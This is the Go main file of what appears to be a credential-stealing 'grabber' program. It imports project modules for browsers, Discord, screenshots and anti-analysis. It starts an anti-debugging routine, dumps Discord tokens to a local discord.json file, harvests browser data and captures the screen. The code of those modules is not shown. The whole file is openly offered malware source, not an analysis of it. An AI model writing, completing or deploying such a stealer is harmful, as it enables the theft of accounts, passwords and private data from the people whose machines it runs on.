// main.go
package main

import (
	"fmt"
	"os"
	"time"

	"kdot/grabber/browsers"
	"kdot/grabber/discord"
	"kdot/grabber/screenshot"

	"kdot/grabber/anti"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	startTime := time.Now()
	go anti.AntiDebug()
	os.WriteFile("discord.json", []byte(discord.GetTokens()), 0644)
	browsers.GetBrowserData()
	screenshot.TakeScreenshot()
	fmt.Println("Time elapsed: ", time.Since(startTime))
	os.Exit(0)
}
